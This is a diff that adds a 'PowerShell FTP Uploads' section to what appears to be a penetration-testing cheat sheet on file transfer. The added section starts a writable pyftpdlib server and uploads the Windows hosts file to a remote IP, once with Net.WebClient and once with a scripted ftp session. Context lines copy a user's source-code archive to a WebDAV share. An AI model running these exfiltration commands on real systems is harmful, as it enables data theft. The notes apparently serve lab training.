@@ -168,3 +168,30 @@ PS C:\user> dir \\192.168.49.128\DavWWWRoot
 
 PS C:\user> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
 ```
+
+## 4) PowerShell FTP Uploads
+
+```bash 
+sudo python3 -m pyftpdlib --port 21 --write
+```
+
+```powershell
+(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
+```
+
+```powershell
+PS C:\user> echo open 192.168.49.128 > ftpcommand.txt
+PS C:\user> echo USER anonymous >> ftpcommand.txt
+PS C:\user> echo binary >> ftpcommand.txt
+PS C:\user> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
+PS C:\user> echo bye >> ftpcommand.txt
+PS C:\user> ftp -v -n -s:ftpcommand.txt
+ftp> open 192.168.49.128
+
+Log in with USER and PASS first.
+
+
+ftp> USER anonymous
+ftp> PUT c:\windows\system32\drivers\etc\hosts
+ftp> bye
+```
